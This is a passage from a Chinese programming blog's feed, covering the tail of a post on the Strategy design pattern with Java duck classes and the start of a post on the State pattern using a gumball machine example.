&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;呱呱叫&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着想办法让鸭子把容易变化的 fly 与 quack 委托（delegate）给别人处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 策略设计模式
&lt;/span>&lt;span style="color:#75715e"> * 鸭子超类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Duck&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Flyable flyable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Quackable quackable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">swim&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;鸭子游泳&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">performFly&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
flyable&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">performQuack&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
quackable&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setQuackable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Quackable quackable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quackable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> quackable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setFlyable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Flyable flyable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">flyable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> flyable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了提供更强的灵活性，我们需要在运行中也能给鸭子对象灵活的设置不同的行为模式。比如增加一个火箭发射器使橡皮鸭也能飞。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 绿头鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MallardDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">MallardDuck&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Flyable flyable&lt;span style="color:#f92672">,&lt;/span> Quackable quackable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">flyable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> flyable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quackable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> quackable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;绿头鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 红头鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RedHeadDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">RedHeadDuck&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Flyable flyable&lt;span style="color:#f92672">,&lt;/span> Quackable quackable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">flyable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> flyable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quackable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> quackable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;红头鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 橡皮鸭
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RubberDuck&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Duck &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">RubberDuck&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Flyable flyable&lt;span style="color:#f92672">,&lt;/span> Quackable quackable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">flyable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> flyable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">quackable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> quackable&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">display&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;橡皮鸭&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 策略设计模式测试类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DuckGameTester&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String args&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 创建行为类
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Flyable flyNoWay &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FlyNoWay&lt;span style="color:#f92672">();&lt;/span>
Flyable flyWithRockets &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FlyWithRockets&lt;span style="color:#f92672">();&lt;/span>
Flyable fly &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Fly&lt;span style="color:#f92672">();&lt;/span>
Quackable muteQuack &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MuteQuack&lt;span style="color:#f92672">();&lt;/span>
Quackable quack &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Quack&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 创建各种类型的鸭子对象
&lt;/span>&lt;span style="color:#75715e">&lt;/span> MallardDuck mallardDuck &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MallardDuck&lt;span style="color:#f92672">(&lt;/span>fly&lt;span style="color:#f92672">,&lt;/span> quack&lt;span style="color:#f92672">);&lt;/span>
mallardDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performFly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
mallardDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performQuack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
mallardDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setQuackable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>muteQuack&lt;span style="color:#f92672">);&lt;/span>
mallardDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performQuack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 创建橡皮鸭对象
&lt;/span>&lt;span style="color:#75715e">&lt;/span> RubberDuck rubberDuck &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RubberDuck&lt;span style="color:#f92672">(&lt;/span>flyNoWay&lt;span style="color:#f92672">,&lt;/span> muteQuack&lt;span style="color:#f92672">);&lt;/span>
rubberDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performFly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
rubberDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performQuack&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
rubberDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFlyable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>flyWithRockets&lt;span style="color:#f92672">);&lt;/span>
rubberDuck&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">performFly&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 继续创建其他新鸭子对象,只需要将行为委托给对应的行为对象就可以
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我们将变化部分的代码抽取封装与稳定部分独立开来，接着通过委托的方式使目标对象将变化的功能委托给了抽取出来的行为（算法族）对象。并且在运行中我们还能随意的改变对象的行为。这种通过组合的方式建立的系统具有很大的弹性，这就是策略设计模式的运用方式。&lt;/p></description></item><item><title>状态设计模式</title><link>https://www.chucklin.net/post/status_designmode/</link><pubDate>Tue, 02 Jan 2018 09:48:23 +0800</pubDate><guid>https://www.chucklin.net/post/status_designmode/</guid><description>&lt;h2 id="什么是状态设计模式">什么是状态设计模式？&lt;/h2>
&lt;p>状态设计模式允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它的类。&lt;/p>
&lt;h2 id="为什么要使用状态设计模式">为什么要使用状态设计模式？&lt;/h2>
&lt;p>状态设计模式可将对象的状态行为封装到单独的状态对象中，并将对象的动作委托到当前状态的对象。通过这样的方式实现封装变化、对扩展开放、对修改关闭以增强代码可读性、扩展性、维护性的目的。&lt;/p>
&lt;h2 id="状态设计模式怎么用">状态设计模式怎么用？&lt;/h2>
&lt;p>试想下面这样一种需求。
万能糖果机公司委托我们通过 java 语言设计一种糖果机的控制程序，以实现类似如下的状态控制流程功能。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-flow" data-lang="flow">st=&amp;gt;start: 开始使用糖果机
op=&amp;gt;operation: 投入硬币
cond=&amp;gt;condition: coins &amp;gt; 25？
op2=&amp;gt;operation: 转动曲柄
op3=&amp;gt;operation: 售出糖果
op4=&amp;gt;operation: 退回投入的硬币
e=&amp;gt;end: 使用完毕
st-&amp;gt;op-&amp;gt;cond
cond(yes)-&amp;gt;op2
cond(no)-&amp;gt;op4
op2-&amp;gt;op3-&amp;gt;e
&lt;/code>&lt;/pre>&lt;p>业务流程拥有至少 3-4 种可执行的动作分别是：投入硬币、退回硬币、转动曲柄、售出糖果。另外还具备 3 种（或者更多）状态对应可执行动作，它们分别是：等待投币、已投币、售罄状态。&lt;/p>
&lt;p>糖果机的业务表面上看起来挺简单的。唯一需要注意的是每次执行某种动作之前，你必须对当前所处的状态进行检查。比如用户在投入硬币且消费硬币之前，无法再次投入硬币。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#f92672">package&lt;/span> designpattern.State&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @author ChuckLin
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">GumballMachine&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 售罄状态
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> SOLD_OUT &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 已投币状态
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> HAS_QUARTER &lt;span style="color:#f92672">=&lt;/span> 2&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 等待投币状态
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> NO_QUARTER &lt;span style="color:#f92672">=&lt;/span> 3&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> state &lt;span style="color:#f92672">=&lt;/span> SOLD_OUT&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> count &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">GumballMachine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> count&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> count&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>count &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
state &lt;span style="color:#f92672">=&lt;/span> NO_QUARTER&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 投币函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> NO_QUARTER&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;投入硬币成功&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
state &lt;span style="color:#f92672">=&lt;/span> HAS_QUARTER&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> SOLD_OUT&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;已售罄,退回硬币&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> HAS_QUARTER&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;请勿重复投入硬币&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;未知的状态错误&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 转动曲柄函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">turnCrank&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> NO_QUARTER&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;还未投入硬币&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
state &lt;span style="color:#f92672">=&lt;/span> HAS_QUARTER&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> SOLD_OUT&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;已售罄。退回硬币&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>state &lt;span style="color:#f92672">==&lt;/span> HAS_QUARTER&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;正在发放糖果。。。。&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发放完毕&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
state &lt;span style="color:#f92672">=&lt;/span> NO_QUARTER&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;未知的状态错误&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这不是一个完整的工业级的糖果机实现。不过在本篇文章中为了简略期间，这样一个简化版的糖果机就足够说明问题了。&lt;/p>
&lt;p>现在你认为代码已经可以交付了。可惜该来的总会来。
万能糖果机公司的产品经理们十分满意我们的工作成果，并希望在糖果机中的流程中增加一个功能。他们希望糖果机在投币后有几率「中奖」，在稍后转动曲柄发放糖果时有几率发放出双倍的糖果以加强糖果机的娱乐性，继而提升销售量。&lt;/p>
&lt;p>现在回过头来看看刚才的代码，并考虑如何对应这个变化。。。。&lt;/p>
&lt;ul>
&lt;li>首先，需要增加一种状态叫做中奖。&lt;/li>
&lt;li>需要在每个动作函数中增加中奖状态的 check。&lt;/li>
&lt;li>在 turnCrank 函数中需要判断当前是否是中奖状态，若是则要发放两倍糖果。并且在最后都需要把状态极的状态还原到最初的状态。&lt;/li>
&lt;/ul>
&lt;p>随着业务复杂度的增加，所对应的状态和动作函数的增多，这样的变更简直是噩梦。而对于产品经理们来说这样的变更和其他千千万万个变更一样属于：「这个需求很简单，怎么实现我不管，明天上线。」的范畴。&lt;/p>
&lt;h3 id="新的设计">新的设计&lt;/h3>
&lt;p>显然又到了设计模式的救场的时候了。
于是新的设计思路如下：&lt;/p>
&lt;ul>
&lt;li>封装变化。&lt;/li>
&lt;li>将状态的行为封装到状态对象中。&lt;/li>
&lt;li>利用组合行为将状态变化委托到每个状态行为对象中去执行。&lt;/li>
&lt;/ul>
&lt;p>依照这样的思路，我们先将状态等易变化的部分封装起来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 状态设计模式
&lt;/span>&lt;span style="color:#75715e"> * 状态接口
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">State&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 投币函数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">insertQuarter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
